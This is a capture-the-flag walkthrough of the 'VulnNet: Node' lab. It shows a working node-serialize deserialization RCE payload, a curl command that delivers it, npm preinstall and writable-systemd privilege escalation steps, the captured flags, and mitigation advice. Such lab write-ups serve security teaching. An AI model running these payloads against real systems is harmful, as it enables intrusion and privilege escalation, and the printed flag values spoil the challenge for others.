
# VulnNet: Node - Comprehensive Technical Walkthrough

## Executive Summary
VulnNet: Node is a Linux-based CTF that focuses on Node.js application security and Linux system misconfigurations. The primary attack vector is an **Insecure Deserialization** vulnerability in the `node-serialize` library. Privilege escalation is achieved through a two-stage process: first by exploiting `sudo` permissions for `npm`, and then by leveraging world-writable `systemd` service files to gain root access.

---

## 1. Phase 1: Reconnaissance & Enumeration

### 1.1 Network Scanning
We began with an Nmap scan to identify the attack surface.

**Command:**
```bash
nmap -sC -sV -p- -T4 10.48.140.137
```

**Results:**
- **Port 22 (SSH):** OpenSSH 8.2p1 Ubuntu
- **Port 8080 (HTTP):** Node.js Express framework

### 1.2 Web Application Analysis
The web server on port 8080 hosts a blog application. A quick inspection of the HTTP headers and cookies revealed a `session` cookie.

**HTTP Response Headers:**
```text
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==; Max-Age=1200; Path=/;
```

**Cookie Decoding:**
The cookie `eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==` is Base64 encoded.
```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

---

## 2. Phase 2: Initial Access (RCE)

### 2.1 Vulnerability Deep-Dive: Node-Serialize
The application uses the `node-serialize` library to handle session management. This library is known to be vulnerable to Remote Code Execution (RCE) when it deserializes objects containing specifically formatted function strings.

The vulnerability resides in the `unserialize()` function. If an object contains a key with a value prefixed by `_$$ND_FUNC$$_`, the library will execute the string as JavaScript code using an Immediately Invoked Function Expression (IIFE).

### 2.2 Exploitation: Reflective RCE
To confirm the vulnerability, we crafted a payload that executes a command and reflects its output in the "Welcome, [username]" header.

**Obstacle:** The application's `server.js` code filters the reflected username:
```javascript
var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
```
This strips all non-alphanumeric characters, making standard output difficult to read.

**Solution:** We updated our payload to return the command output in **Hexadecimal** format, ensuring it passes through the filter intact.

**Final RCE Payload (Serialized):**
```json
{
  "username": "_$$ND_FUNC$$_function (){ try { var out = require('child_process').execSync('id').toString(); return 'HEX' + Buffer.from(out).toString('hex'); } catch(e) { return 'ERR' + Buffer.from(e.toString()).toString('hex'); } }()",
  "isGuest": false
}
```

**Execution:**
1. Base64 encode the JSON.
2. Send via `curl`:
```bash
curl -s -H "Cookie: session=[BASE64_PAYLOAD]" http://10.48.140.137:8080/
```

### 2.3 User Flag
By enumerating the `/home` directory, we identified the user `serv-manage`.
- **Command:** `ls -la /home/serv-manage`
- **User Flag:** `THM{064640a2f880ce9ed7a54886f1bde821}`

---

## 3. Phase 3: Privilege Escalation

### 3.1 Stage 1: www -> serv-manage (Exploiting Sudo NPM)
Checking the `www` user's sudo privileges:
```bash
www@vulnnet-node:~$ sudo -l
User www may run the following commands:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

`npm` allows for arbitrary command execution during package installation via "scripts" defined in `package.json`.

**Exploit Steps:**
1. Create a malicious `package.json`:
```json
{
  "scripts": {
    "preinstall": "cat /home/serv-manage/user.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt"
  }
}
```
2. Execute the install as `serv-manage`:
```bash
sudo -u serv-manage /usr/bin/npm -C /tmp/pwn --unsafe-perm i
```
3. Read the flag from `/tmp/flag.txt`.

### 3.2 Stage 2: serv-manage -> root (Systemd Exploitation)
Checking the `serv-manage` user's sudo privileges:
```bash
serv-manage@vulnnet-node:~$ sudo -l
User serv-manage may run the following commands:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

**Vulnerability:** We discovered that `/etc/systemd/system/vulnnet-job.service` was **writable** by the `serv-manage` group.

**Exploit Steps:**
1.  **Modify the Service:** Overwrite the service file to execute a malicious command as root.
    ```ini
    [Unit]
    Description=Pwn

    [Service]
    Type=oneshot
    ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt"

    [Install]
    WantedBy=multi-user.target
    ```
2.  **Reload Daemon:** `sudo /bin/systemctl daemon-reload`
3.  **Trigger the Service:** Since the timer (`vulnnet-auto.timer`) triggers this service, we restarted it.
    ```bash
    sudo /bin/systemctl stop vulnnet-auto.timer
    sudo /bin/systemctl start vulnnet-auto.timer
    ```
4.  **Capture Root Flag:** The root flag was copied to `/tmp/root_flag.txt`.

**Root Flag:** `THM{abea728f211b105a608a720a37adabf9}`

---

## 4. Lessons Learned & Mitigation

1.  **Secure Deserialization:** Never use `node-serialize` or similar libraries on untrusted user input. Use `JSON.parse()` for standard data exchange.
2.  **Principle of Least Privilege (PoLP):**
    - The `www` user should not have `sudo` access to `npm`.
    - Avoid granting `sudo` access to binaries that have built-in shell escape or script execution capabilities (GTFOBins).
3.  **Hardening Systemd:** Systemd unit files in `/etc/systemd/system/` should only be writable by `root`.
4.  **Output Filtering:** While the application had output filtering, it only addressed reflection/XSS, not the underlying code execution vulnerability.
